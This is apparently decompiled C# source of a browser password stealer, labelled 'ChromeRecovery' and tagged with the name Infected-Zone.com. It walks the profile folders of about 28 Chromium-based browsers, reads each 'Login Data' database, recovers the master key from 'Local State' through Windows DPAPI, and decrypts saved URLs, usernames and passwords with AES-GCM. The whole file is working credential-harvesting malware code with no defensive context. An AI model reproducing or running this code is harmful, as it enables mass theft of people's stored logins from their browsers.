using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using W2;

namespace ChromeRecovery
{
	// Token: 0x02000006 RID: 6
	public class Chromium//Infected-Zone.com
	{
		// Token: 0x0600001C RID: 28 RVA: 0x0000259C File Offset: 0x0000079C
		public static List<Account> Grab()
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{
					"Chrome",
					Chromium.LocalApplicationData + "\\Google\\Chrome\\User Data"
				},
				{
					"Opera",
					Path.Combine(Chromium.ApplicationData, "Opera Software\\Opera Stable")
				},
				{
					"Yandex",
					Path.Combine(Chromium.LocalApplicationData, "Yandex\\YandexBrowser\\User Data")
				},
				{
					"360 Browser",
					Chromium.LocalApplicationData + "\\360Chrome\\Chrome\\User Data"
				},
				{
					"Comodo Dragon",
					Path.Combine(Chromium.LocalApplicationData, "Comodo\\Dragon\\User Data")
				},
				{
					"CoolNovo",
					Path.Combine(Chromium.LocalApplicationData, "MapleStudio\\ChromePlus\\User Data")
				},
				{
					"SRWare Iron",
					Path.Combine(Chromium.LocalApplicationData, "Chromium\\User Data")
				},
				{
					"Torch Browser",
					Path.Combine(Chromium.LocalApplicationData, "Torch\\User Data")
				},
				{
					"Brave Browser",
					Path.Combine(Chromium.LocalApplicationData, "BraveSoftware\\Brave-Browser\\User Data")
				},
				{
					"Iridium Browser",
					Chromium.LocalApplicationData + "\\Iridium\\User Data"
				},
				{
					"7Star",
					Path.Combine(Chromium.LocalApplicationData, "7Star\\7Star\\User Data")
				},
				{
					"Amigo",
					Path.Combine(Chromium.LocalApplicationData, "Amigo\\User Data")
				},
				{
					"CentBrowser",
					Path.Combine(Chromium.LocalApplicationData, "CentBrowser\\User Data")
				},
				{
					"Chedot",
					Path.Combine(Chromium.LocalApplicationData, "Chedot\\User Data")
				},
				{
					"CocCoc",
					Path.Combine(Chromium.LocalApplicationData, "CocCoc\\Browser\\User Data")
				},
				{
					"Elements Browser",
					Path.Combine(Chromium.LocalApplicationData, "Elements Browser\\User Data")
				},
				{
					"Epic Privacy Browser",
					Path.Combine(Chromium.LocalApplicationData, "Epic Privacy Browser\\User Data")
				},
				{
					"Kometa",
					Path.Combine(Chromium.LocalApplicationData, "Kometa\\User Data")
				},
				{
					"Orbitum",
					Path.Combine(Chromium.LocalApplicationData, "Orbitum\\User Data")
				},
				{
					"Sputnik",
					Path.Combine(Chromium.LocalApplicationData, "Sputnik\\Sputnik\\User Data")
				},
				{
					"uCozMedia",
					Path.Combine(Chromium.LocalApplicationData, "uCozMedia\\Uran\\User Data")
				},
				{
					"Vivaldi",
					Path.Combine(Chromium.LocalApplicationData, "Vivaldi\\User Data")
				},
				{
					"Sleipnir 6",
					Path.Combine(Chromium.ApplicationData, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")
				},
				{
					"Citrio",
					Path.Combine(Chromium.LocalApplicationData, "CatalinaGroup\\Citrio\\User Data")
				},
				{
					"Coowon",
					Path.Combine(Chromium.LocalApplicationData, "Coowon\\Coowon\\User Data")
				},
				{
					"Liebao Browser",
					Path.Combine(Chromium.LocalApplicationData, "liebao\\User Data")
				},
				{
					"QIP Surf",
					Path.Combine(Chromium.LocalApplicationData, "QIP Surf\\User Data")
				},
				{
					"Edge Chromium",
					Path.Combine(Chromium.LocalApplicationData, "Microsoft\\Edge\\User Data")
				}
			};
			List<Account> list = new List<Account>();
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				list.AddRange(Chromium.Accounts(keyValuePair.Value, keyValuePair.Key, "logins"));
			}
			return list;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000290C File Offset: 0x00000B0C
		private static List<Account> Accounts(string path, string browser, string table = "logins")
		{
			List<string> allProfiles = Chromium.GetAllProfiles(path);
			List<Account> list = new List<Account>();
			foreach (string text in allProfiles.ToArray())
			{
				bool flag = !File.Exists(text);
				if (!flag)
				{
					classSQLiteHandler sqliteHandler;
					try
					{
						sqliteHandler = new classSQLiteHandler(text);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
						goto IL_1B4;
					}
					bool flag2 = !sqliteHandler.ReadTable(table);
					if (!flag2)
					{
						int j = 0;
						while (j <= sqliteHandler.GetRowCount() - 1)
						{
							try
							{
								string value = sqliteHandler.GetValue(j, "origin_url");
								string value2 = sqliteHandler.GetValue(j, "username_value");
								string text2 = sqliteHandler.GetValue(j, "password_value");
								bool flag3 = text2 != null;
								if (flag3)
								{
									bool flag4 = text2.StartsWith("v10") || text2.StartsWith("v11");
									if (flag4)
									{
										byte[] masterKey = Chromium.GetMasterKey(Directory.GetParent(text).Parent.FullName);
										bool flag5 = masterKey == null;
										if (flag5)
										{
											goto IL_194;
										}
										text2 = Chromium.DecryptWithKey(Encoding.Default.GetBytes(text2), masterKey);
									}
									else
									{
										text2 = Chromium.Decrypt(text2);
									}
									bool flag6 = !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(text2);
									if (flag6)
									{
										list.Add(new Account
										{
											URL = value,
											UserName = value2,
											Password = text2,
											Application = browser
										});
									}
								}
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
							}
							IL_194:
							j++;
							continue;
							goto IL_194;
						}
					}
				}
				IL_1B4:;
			}
			return list;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002B18 File Offset: 0x00000D18
		private static List<string> GetAllProfiles(string DirectoryPath)
		{
			List<string> list = new List<string>
			{
				DirectoryPath + "\\Default\\Login Data",
				DirectoryPath + "\\Login Data"
			};
			bool flag = Directory.Exists(DirectoryPath);
			if (flag)
			{
				foreach (string text in Directory.GetDirectories(DirectoryPath))
				{
					bool flag2 = text.Contains("Profile");
					if (flag2)
					{
						list.Add(text + "\\Login Data");
					}
				}
			}
			return list;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002BA8 File Offset: 0x00000DA8
		public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(encryptedData, 3, array, 0, 12);
			string result;
			try
			{
				byte[] array2 = new byte[encryptedData.Length - 15];
				Array.Copy(encryptedData, 15, array2, 0, encryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				AesGcm aesGcm = new AesGcm();
				string @string = Encoding.UTF8.GetString(aesGcm.Decrypt(MasterKey, array, null, array4, array3));
				result = @string;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002C6C File Offset: 0x00000E6C
		public static byte[] GetMasterKey(string LocalStateFolder)
		{
			string path = LocalStateFolder + "\\Local State";
			byte[] array = new byte[0];
			bool flag = !File.Exists(path);
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
				foreach (object obj in matchCollection)
				{
					Match match = (Match)obj;
					bool success = match.Success;
					if (success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					result = ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
					result = null;
				}
			}
			return result;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002D78 File Offset: 0x00000F78
		public static string Decrypt(string encryptedData)
		{
			bool flag = encryptedData == null || encryptedData.Length == 0;
			string result;
			if (flag)
			{
				result = null;
			}
			else
			{
				try
				{
					result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
					result = null;
				}
			}
			return result;
		}

		// Token: 0x04000013 RID: 19
		public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000014 RID: 20
		public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}
}
